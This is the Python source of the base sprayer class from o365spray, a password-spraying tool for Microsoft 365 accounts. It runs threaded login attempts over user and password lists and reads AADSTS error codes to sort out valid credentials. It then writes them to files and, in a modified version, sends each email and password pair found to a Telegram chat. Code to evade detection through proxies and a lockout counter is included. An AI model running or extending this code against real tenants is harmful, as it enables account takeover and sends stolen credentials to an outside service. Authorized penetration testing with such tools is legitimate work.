#!/usr/bin/env python3

import asyncio
import concurrent.futures
import concurrent.futures.thread
import logging
import threading
import urllib3  # type: ignore
from functools import partial
from itertools import cycle
from typing import (
    Dict,
    List,
    Union,
)

from o365spray.core.handlers.base import BaseHandler
from o365spray.core.utils import (
    Defaults,
    DefaultFiles,
    Helper,
    TelegramNotifier,
    ThreadWriter,
    text_colors,
    RequestLogger,
)


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class SprayerBase(BaseHandler):

    HELPER = Helper()  # Helper functions
    VALID_CREDENTIALS = []  # Valid credentials storage

    def __init__(
        self,
        loop: Defaults.EventLoop,
        domain: str = None,
        userlist: List[str] = None,
        output_dir: str = None,
        timeout: int = 25,
        proxy: Union[str, Dict[str, str]] = None,
        workers: int = 5,
        lock_threshold: int = 5,
        adfs_url: str = None,
        writer: bool = True,
        sleep: int = 0,
        jitter: int = 0,
        proxy_url: str = None,
        request_retries: int = 1,
        request_retry_backoff: float = 0.5,
        telegram_token: str = None,
        telegram_chat_id: str = None,
        *args,
        **kwargs,
    ):
        """Initialize a Sprayer instance.

        Note:
            All arguments, besides loop, are optional so that the Sprayer
            instance can be used to re-run the run() method multiple times
            against multiple domains/user lists without requiring a new instance
            or class level var modifications.

        Arguments:
            <required>
            loop: asyncio event loop
            <optional>
            domain: domain to spray users against
            userlist: list of users to spray
            output_dir: directory to write results to
            timeout: http request timeout
            proxy: http request proxy
            workers: thread pool worker rate
            lock_threshold: locked account threashold
            adfs_url: ADFS AuthURL
            writer: toggle writing to output files
            sleep: throttle http requests
            jitter: randomize throttle
            proxy_url: fireprox api url
            request_retries: number of retries for transient request errors
            request_retry_backoff: initial backoff in seconds for retries
            telegram_token: telegram bot token for spray notifications
            telegram_chat_id: telegram chat id or @channel for spray notifications

        Raises:
            ValueError: if no output directory provided when output writing
              is enabled
        """
        super().__init__(*args, **kwargs)

        if writer and not output_dir:
            raise ValueError("Missing 1 required argument: 'output_dir'")

        # If proxy server provided, build HTTP proxies object for
        # requests lib
        if isinstance(proxy, str):
            proxy = {"http": proxy, "https": proxy}

        self.loop = loop
        self.userlist = userlist
        self.domain = domain
        # Updated: store output directory for downstream logging/reporting.
        self.output_dir = output_dir
        # Updated: store raw CLI log file path for shutdown summaries.
        self.raw_log_file = f"{output_dir}{DefaultFiles.SPRAY_LOG_FILE}" if output_dir else None
        self.timeout = timeout
        self.proxies = proxy
        self.locked_limit = lock_threshold
        self.adfs_url = adfs_url
        self.sleep = sleep
        self.jitter = jitter
        self.proxy_url = proxy_url
        self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=workers)
        # Updated: configure retries for transient request failures.
        self.request_retries = max(0, int(request_retries))
        self.request_retry_backoff = float(request_retry_backoff)
        # Updated: configure Telegram notifications for valid credentials.
        self.telegram_notifier = TelegramNotifier(
            token=telegram_token,
            chat_id=telegram_chat_id,
        )
        self._notify_lock = threading.Lock()
        self._notified_credentials = set()

        # Internal exit handler
        self.exit = False

        # Global locked account counter
        self.lockout = 0
        # Updated: ensure lockout tracking is thread-safe and logged once.
        self._lockout_lock = threading.Lock()
        self._lockout_reached = False

        # Initialize writers
        self.writer = writer
        if self.writer:
            self.valid_writer = ThreadWriter(DefaultFiles.SPRAY_FILE, output_dir)
            self.tested_writer = ThreadWriter(DefaultFiles.SPRAY_TESTED, output_dir)
            # Updated: initialize per-request logger for spraying.
            self.request_logger = RequestLogger(output_dir, action="spray")

    def _record_lockout(self, reason: str = None):
        """Record a locked account event and enforce safe threshold."""
        # Updated: centralize lockout counting and threshold enforcement.
        with self._lockout_lock:
            self.lockout += 1
            reached = self.lockout >= self.locked_limit

        if reached and not self._lockout_reached:
            self._lockout_reached = True
            self.exit = True
            msg = (
                f"Locked account threshold reached (count={self.lockout} "
                f"limit={self.locked_limit})."
            )
            if reason:
                msg += f" Reason: {reason}."
            logging.error(msg)
        return reached

    def _detect_lockout_signal(self, response) -> bool:
        """Detect explicit lockout signals from a response."""
        # Updated: only treat explicit AADSTS50053 as lockout to avoid false positives.
        try:
            if not response:
                return False
            if "AADSTS50053" in (response.text or ""):
                return True
            for value in response.headers.values():
                if "AADSTS50053" in str(value):
                    return True
        except Exception:
            return False
        return False

    def _should_abort(self) -> bool:
        """Check if spraying should abort due to lockout threshold."""
        # Updated: provide a single abort check for modules.
        return self.exit or self.lockout >= self.locked_limit

    def _log_spray_result(
        self,
        result: str,
        email: str,
        password: str,
        status: int = None,
        reason: str = None,
        detail: str = None,
    ):
        """Standardized CLI output for spray results."""
        # Updated: unify CLI messages for more professional output.
        # Updated: use warning color for notable non-valid outcomes.
        if result == "VALID":
            color = text_colors.OKGREEN
        elif result in {"BLOCKED", "WARNING", "MFA", "LOCKED"}:
            color = text_colors.WARNING
        else:
            color = text_colors.FAIL
        parts = [f"[{color}{result}{text_colors.ENDC}] {email}:{password}"]
        meta = [f"module={self.module_tag}"]
        if status is not None:
            meta.append(f"status={status}")
        if reason:
            meta.append(f"reason={reason}")
        if detail:
            meta.append(f"detail={detail}")
        if meta:
            parts.append(" | ".join(meta))
        logging.info(" | ".join(parts))
        if result == "VALID":
            self._notify_valid_credential(
                email=email,
                password=password,
                status=status,
                reason=reason,
                detail=detail,
            )

    def _notify_valid_credential(
        self,
        email: str,
        password: str,
        status: int = None,
        reason: str = None,
        detail: str = None,
    ):
        """Send a Telegram notification for a valid credential."""
        if not self.telegram_notifier or not self.telegram_notifier.enabled:
            return

        cred_key = f"{email}:{password}"
        with self._notify_lock:
            if cred_key in self._notified_credentials:
                return
            self._notified_credentials.add(cred_key)

        message_lines = [
            "o365spray: VALID credential found",
            f"Domain: {self.domain}",
            f"Module: {self.module_tag}",
            f"User: {email}",
            f"Password: {password}",
        ]
        if status is not None:
            message_lines.append(f"HTTP: {status}")
        if reason:
            message_lines.append(f"Reason: {reason}")
        if detail:
            message_lines.append(f"Detail: {detail}")

        self.telegram_notifier.send_message("\n".join(message_lines))

    def shutdown(self, key: bool = False):
        """Custom method to handle exitting multi-threaded tasking.

        Arguments:
            key: identify if we are shutting down normally or via a
              caught signal
        """
        msg = "\n\n[ ! ] CTRL-C caught." if key else "\n"
        if self.writer:
            msg += f"\n[ * ] Writing valid credentials to: '{self.valid_writer.output_file}'"  # ignore
            msg += f"\n[ * ] All sprayed credentials can be found at: '{self.tested_writer.output_file}'\n"
            # Updated: include raw CLI log file and per-request log directory.
            if self.raw_log_file:
                msg += f"\n[ * ] Raw CLI output can be found at: '{self.raw_log_file}'"
            if self.request_logger:
                msg += f"\n[ * ] HTTP request logs directory: '{self.request_logger.log_dir}'"

        print(Defaults.ERASE_LINE, end="\r")
        logging.info(msg)

        # https://stackoverflow.com/a/48351410
        # https://gist.github.com/yeraydiazdiaz/b8c059c6dcfaf3255c65806de39175a7
        # Unregister _python_exit while using asyncio
        # Shutdown ThreadPoolExecutor and do not wait for current work
        import atexit

        atexit.unregister(concurrent.futures.thread._python_exit)
        self.executor.shutdown = lambda wait: None

        # Close the open file handles
        if self.writer:
            self.valid_writer.close()
            self.tested_writer.close()

    def _check_aadsts(
        self,
        user: str,
        email: str,
        password: str,
        response: str,
        status: int = None,
        reason: str = None,
    ):
        """Helper function to parse X-AutoDiscovery-Error headers
        and/or response body for MS AADSTS errors.

        Arguments:
            user: initial username
            email: email formatted username
            password: password used during auth
            response: http reponse string to search
        """
        code = None
        for c in Defaults.AADSTS_CODES.keys():
            if c in response:
                code = c
                break

        # Account for invalid credentials error code
        if code and code != "AADSTS50126":
            # Handle lockout tracking
            if code == "AADSTS50053":
                self._record_lockout(reason="AADSTS50053")

            # These error codes occur via oAuth2 only after a valid
            # authentication has been processed
            # Also account for expired passwords which only trigger
            # after valid authentication
            err = Defaults.AADSTS_CODES[code][0]
            msg = Defaults.AADSTS_CODES[code][1]
            if code in Defaults.VALID_AADSTS_CODES:
                tested = f"{email}:{password}"
                if self.writer:
                    self.valid_writer.write(tested)
                self.VALID_CREDENTIALS.append(tested)
                # Updated: richer CLI output for valid results with AADSTS context.
                detail = f"{err} ({msg})"
                self._log_spray_result(
                    "VALID",
                    email,
                    password,
                    status=status,
                    reason=reason,
                    detail=detail,
                )

            else:
                err = Defaults.AADSTS_CODES[code][0]
                msg = Defaults.AADSTS_CODES[code][1]
                # Updated: richer CLI output for invalid results with AADSTS context.
                detail = f"{err} ({msg})"
                self._log_spray_result(
                    "INVALID",
                    email,
                    password,
                    status=status,
                    reason=reason,
                    detail=detail,
                )

            # Remove errored user from being sprayed again
            self.userlist.remove(user)

        else:
            # Updated: surface invalid attempts in CLI with module metadata.
            self._log_spray_result(
                "INVALID",
                email,
                password,
                status=status,
                reason=reason,
                detail="No AADSTS code detected",
            )

    async def run(
        self,
        password: Union[str, List[str]],
        domain: str = None,
        userlist: List[str] = None,
    ):
        """Asyncronously Send HTTP Requests to password spray a list of users.
        This method's params override the class' level of params.

        Arguments:
            <required>
            password: single or multiple passwords based on if a spray
              should be run as paired
            <optional>
            module: spray module to run
            domain: domain to spray users against
            userlist: list of users to spray
        """
        # Re-initialize the class userlist each run if a user provides
        # a new list - otherwise use the current class list
        self.userlist = userlist or self.userlist
        if not self.userlist:
            raise ValueError("No user list provided for spraying.")
        if not isinstance(self.userlist, list):
            raise ValueError(
                f"Provided user list is not a list -> provided: {type(self.userlist)}"
            )

        domain = domain or self.domain
        if not domain:
            raise ValueError(f"Invalid domain for password spraying: '{domain}'")
        # Updated: stop early if lockout threshold already reached.
        if self._should_abort():
            return

        if isinstance(password, list):
            # Since we assume this is our --paired handling, we will also
            # assume that the user list and password list are the same
            # length
            creds = zip(self.userlist, password)
        else:
            # Assume the password is not an object like a dict or instance
            # and that a single string/int/value was passed
            creds = zip(self.userlist, cycle([password]))

        blocking_tasks = [
            self.loop.run_in_executor(
                self.executor,
                partial(
                    self._spray,
                    domain=domain,
                    user=user,
                    password=passwd,
                ),
            )
            for user, passwd in creds
        ]

        if blocking_tasks:
            await asyncio.wait(blocking_tasks)

    def _spray(self, domain: str, user: str, password: str):
        """Parent implementation of module child method"""
        raise NotImplementedError("Must override _spray")
